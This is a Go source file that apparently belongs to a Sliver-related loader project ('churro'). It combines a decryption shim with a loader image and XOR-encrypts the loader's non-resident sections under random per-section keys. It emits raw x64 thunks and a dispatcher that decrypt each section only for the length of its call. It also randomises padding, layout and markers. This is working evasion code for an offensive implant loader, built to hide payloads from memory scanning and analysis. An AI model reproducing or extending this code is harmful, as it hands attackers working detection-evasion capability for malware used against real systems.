package churro

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"strings"

	"github.com/sliverarmory/churro/internal/assets"
)

const (
	dispatchSlotSize  = 384
	dispatchThunkSize = 17
	shimMaxFunctions  = 16
)

func embeddedLoaderMetadata(second bool) (LoaderMetadata, error) {
	var raw []byte
	if second {
		raw = assets.LoaderPEB2Metadata
	} else {
		raw = assets.LoaderPEB1Metadata
	}
	var meta LoaderMetadata
	if err := json.Unmarshal(raw, &meta); err != nil {
		return LoaderMetadata{}, fmt.Errorf("parse embedded loader metadata: %w", err)
	}
	return meta, nil
}

// prepareCombinedWithMetadata uses the section table produced by exe2h.
// With one section, the shim decrypts the complete loader once. With multiple
// sections, .text stays resident and references into other sections pass
// through a dispatcher that decrypts the callee for the duration of its call.
func prepareCombinedWithMetadata(loaderImage, shimImage []byte, meta LoaderMetadata, entropy io.Reader) ([]byte, error) {
	if err := validateLoaderMetadata(meta, loaderImage); err != nil {
		return nil, fmt.Errorf("loader metadata: %w", err)
	}
	if len(meta.Functions) == 1 {
		return prepareCombined(loaderImage, shimImage, entropy)
	}
	if len(meta.Functions)+1 > shimMaxFunctions {
		return nil, fmt.Errorf("%d loader sections exceed the dispatch table capacity", len(meta.Functions))
	}
	if len(shimImage) < 16 || entropy == nil {
		return nil, fmt.Errorf("missing dispatch shim or entropy source")
	}
	if meta.Functions[0].Name != ".text" {
		return nil, fmt.Errorf("the loader entry section must be resident .text")
	}

	resident := make([]bool, len(meta.Functions))
	for i, fn := range meta.Functions {
		resident[i] = strings.HasPrefix(fn.Name, ".text")
	}
	protectedRefs := 0
	for _, ref := range meta.References {
		if !resident[ref.TargetFn] {
			protectedRefs++
		}
	}
	var choices [2]byte
	if _, err := io.ReadFull(entropy, choices[:]); err != nil {
		return nil, fmt.Errorf("select dispatch layout: %w", err)
	}
	prePad := int(choices[0] & 63)
	inputSwap := choices[1]&1 != 0
	shimPadded := (len(shimImage) + 4095) &^ 4095
	tailSize := prePad + dispatchSlotSize + protectedRefs*dispatchThunkSize
	if len(loaderImage) > math.MaxInt32-shimPadded-tailSize {
		return nil, fmt.Errorf("combined loader exceeds size limit")
	}
	combined := make([]byte, shimPadded+len(loaderImage)+tailSize)
	copy(combined, shimImage)
	if _, err := io.ReadFull(entropy, combined[len(shimImage):shimPadded]); err != nil {
		return nil, fmt.Errorf("generate shim padding: %w", err)
	}
	copy(combined[shimPadded:], loaderImage)
	if _, err := io.ReadFull(entropy, combined[shimPadded+len(loaderImage):]); err != nil {
		return nil, fmt.Errorf("generate dispatch padding: %w", err)
	}
	if err := patchShimBounds(combined[:len(shimImage)], uint32(shimPadded), uint32(len(loaderImage))); err != nil {
		return nil, err
	}
	marker := []byte{0xb1, 0x7a, 0x7e, 0xf1, 0xb1, 0x7a, 0x7e, 0xf1}
	ft := bytes.Index(combined[:len(shimImage)], marker)
	if ft < 0 || ft+16+(len(meta.Functions)+1)*12 > len(shimImage) {
		return nil, fmt.Errorf("dispatch shim function table is missing or too small")
	}
	if bytes.Index(combined[ft+1:len(shimImage)], marker) >= 0 {
		return nil, fmt.Errorf("dispatch shim function table marker is ambiguous")
	}

	dispatchOff := shimPadded + len(loaderImage) + prePad
	dispatcher := emitNativeDispatcher(uint32(dispatchOff), uint32(shimPadded), uint32(ft), inputSwap)
	if len(dispatcher) > dispatchSlotSize {
		return nil, fmt.Errorf("dispatch code exceeds reserved slot: %d", len(dispatcher))
	}
	copy(combined[dispatchOff:], dispatcher)
	thunkNum := 0
	for i, ref := range meta.References {
		if resident[ref.TargetFn] {
			continue
		}
		srcDisp := int(ref.SrcBlobOff) + int(ref.DispOffset)
		oldRel := int32(binary.LittleEndian.Uint32(combined[shimPadded+srcDisp : shimPadded+srcDisp+4]))
		target := int64(ref.SrcBlobOff) + int64(ref.InstLength) + int64(oldRel)
		callee := meta.Functions[ref.TargetFn]
		if target < int64(callee.Offset) || target >= int64(callee.Offset)+int64(callee.Size) {
			return nil, fmt.Errorf("reference %d resolves outside target section %q", i, callee.Name)
		}
		thunkOff := dispatchOff + dispatchSlotSize + thunkNum*dispatchThunkSize
		fromThunkEnd := int64(thunkOff + dispatchThunkSize)
		toDispatcher := int64(dispatchOff) - fromThunkEnd
		newRel := int64(thunkOff-shimPadded) - int64(ref.SrcBlobOff) - int64(ref.InstLength)
		if toDispatcher < math.MinInt32 || toDispatcher > math.MaxInt32 || newRel < math.MinInt32 || newRel > math.MaxInt32 {
			return nil, fmt.Errorf("reference %d is out of rel32 range", i)
		}
		var order [1]byte
		if _, err := io.ReadFull(entropy, order[:]); err != nil {
			return nil, fmt.Errorf("select thunk order: %w", err)
		}
		thunk := emitNativeThunk(uint32(target), uint32(ref.TargetFn), int32(toDispatcher), inputSwap, order[0]&1 != 0)
		copy(combined[thunkOff:thunkOff+dispatchThunkSize], thunk)
		binary.LittleEndian.PutUint32(combined[shimPadded+srcDisp:shimPadded+srcDisp+4], uint32(int32(newRel)))
		thunkNum++
	}
	binary.LittleEndian.PutUint32(combined[ft+8:ft+12], uint32(len(meta.Functions)+1))
	for i, fn := range meta.Functions {
		entry := combined[ft+16+i*12 : ft+16+(i+1)*12]
		binary.LittleEndian.PutUint32(entry[:4], fn.Offset)
		binary.LittleEndian.PutUint32(entry[4:8], fn.Size)
		entry[8], entry[9], entry[10], entry[11] = 0, 1, 0, 0
		if !resident[i] {
			var key [1]byte
			for key[0] == 0 {
				if _, err := io.ReadFull(entropy, key[:]); err != nil {
					return nil, fmt.Errorf("generate function key: %w", err)
				}
			}
			entry[8], entry[9] = key[0], 0
			for j := fn.Offset; j < fn.Offset+fn.Size; j++ {
				combined[shimPadded+int(j)] ^= key[0]
			}
		}
	}
	tail := combined[ft+16+len(meta.Functions)*12 : ft+16+(len(meta.Functions)+1)*12]
	binary.LittleEndian.PutUint32(tail[:4], uint32(len(loaderImage)))
	binary.LittleEndian.PutUint32(tail[4:8], uint32(tailSize))
	tail[8], tail[9], tail[10], tail[11] = 0, 1, 0, 0
	if _, err := io.ReadFull(entropy, combined[ft:ft+8]); err != nil {
		return nil, fmt.Errorf("scramble function table marker: %w", err)
	}
	return combined, nil
}

func patchShimBounds(shim []byte, offset, size uint32) error {
	patchedOffset, patchedSize := false, false
	for i := 0; i+4 <= len(shim); i++ {
		switch binary.LittleEndian.Uint32(shim[i : i+4]) {
		case 0xDEAD0001:
			if !patchedOffset {
				binary.LittleEndian.PutUint32(shim[i:i+4], offset)
				patchedOffset = true
			}
		case 0xDEAD0002:
			if !patchedSize {
				binary.LittleEndian.PutUint32(shim[i:i+4], size)
				patchedSize = true
			}
		}
	}
	if !patchedOffset || !patchedSize {
		return fmt.Errorf("dispatch shim sentinels are missing")
	}
	return nil
}

func emitNativeThunk(targetOff, fnID uint32, dispatcherRel int32, swapped, reverseOrder bool) []byte {
	targetOp, idOp := byte(0xba), byte(0xbb) // mov r10d/r11d, imm32
	if swapped {
		targetOp, idOp = idOp, targetOp
	}
	thunk := make([]byte, 0, dispatchThunkSize)
	putMov := func(op byte, imm uint32) {
		thunk = append(thunk, 0x41, op)
		thunk = binary.LittleEndian.AppendUint32(thunk, imm)
	}
	if reverseOrder {
		putMov(idOp, fnID)
		putMov(targetOp, targetOff)
	} else {
		putMov(targetOp, targetOff)
		putMov(idOp, fnID)
	}
	thunk = append(thunk, 0xe9)
	return binary.LittleEndian.AppendUint32(thunk, uint32(dispatcherRel))
}

// emitNativeDispatcher preserves the Microsoft x64 argument registers and
// nonvolatile registers around a callee. Its RIP displacements are derived
// from the combined image offsets, so the emitted bytes remain position free.
func emitNativeDispatcher(selfOff, loaderOff, ftOff uint32, swapped bool) []byte {
	d := make([]byte, 0, 256)
	put := func(v ...byte) { d = append(d, v...) }
	rip := func(target uint32) {
		rel := int64(target) - int64(selfOff) - int64(len(d)) - 4
		d = binary.LittleEndian.AppendUint32(d, uint32(int32(rel)))
	}
	// Seven saves put RSP on a 16-byte boundary before the callee call.
	put(0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57)
	put(0x48, 0x83, 0xec, 0x60)
	put(0x48, 0x89, 0x4c, 0x24, 0x20) // save RCX
	put(0x48, 0x89, 0x54, 0x24, 0x28) // save RDX
	put(0x4c, 0x89, 0x44, 0x24, 0x30) // save R8
	put(0x4c, 0x89, 0x4c, 0x24, 0x38) // save R9
	put(0x48, 0x8d, 0x35)
	rip(ftOff)
	put(0x48, 0x83, 0xc6, 0x10) // RSI = first function entry
	if swapped {
		put(0x45, 0x89, 0xd4) // R12D = R10D = function ID
	} else {
		put(0x45, 0x89, 0xdc) // R12D = R11D = function ID
	}
	put(0x4d, 0x6b, 0xe4, 0x0c)             // R12 *= 12
	put(0x49, 0x01, 0xf4)                   // R12 += RSI
	put(0x45, 0x8b, 0x6c, 0x24, 0x00)       // R13D = entry offset
	put(0x45, 0x8b, 0x74, 0x24, 0x04)       // R14D = entry size
	put(0x45, 0x0f, 0xb6, 0x7c, 0x24, 0x08) // R15D = byte key
	put(0x48, 0x8d, 0x05)
	rip(loaderOff)                    // RAX = loader base
	put(0x49, 0x89, 0xc4)             // R12 = loader base
	put(0x4c, 0x01, 0xe8)             // RAX += R13 (section offset)
	put(0x48, 0x89, 0xc7)             // RDI = section base
	appendNativeXORLoop(&d)           // decrypt
	put(0x48, 0x8b, 0x4c, 0x24, 0x20) // restore RCX
	put(0x48, 0x8b, 0x54, 0x24, 0x28) // restore RDX
	put(0x4c, 0x8b, 0x44, 0x24, 0x30) // restore R8
	put(0x4c, 0x8b, 0x4c, 0x24, 0x38) // restore R9
	put(0x4c, 0x89, 0xe0)             // RAX = loader base
	if swapped {
		put(0x4c, 0x01, 0xd8) // RAX += R11 target offset
	} else {
		put(0x4c, 0x01, 0xd0) // RAX += R10 target offset
	}
	put(0xff, 0xd0)                   // call RAX
	put(0x48, 0x89, 0x44, 0x24, 0x40) // save return value
	put(0x48, 0x89, 0xf8)             // RAX = RDI section base
	appendNativeXORLoop(&d)           // re-encrypt
	put(0x48, 0x8b, 0x44, 0x24, 0x40) // restore return value
	put(0x48, 0x83, 0xc4, 0x60)
	put(0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0xc3)
	return d
}

func appendNativeXORLoop(d *[]byte) {
	// ECX = section size; R15B is the key. Only volatile RCX/RAX change.
	*d = append(*d, 0x44, 0x89, 0xf1)
	top := len(*d)
	*d = append(*d, 0x44, 0x30, 0x38)                // xor byte [rax], r15b
	*d = append(*d, 0x48, 0xff, 0xc0)                // inc rax
	*d = append(*d, 0xff, 0xc9)                      // dec ecx
	*d = append(*d, 0x75, byte(int8(top-len(*d)-2))) // jnz top
}
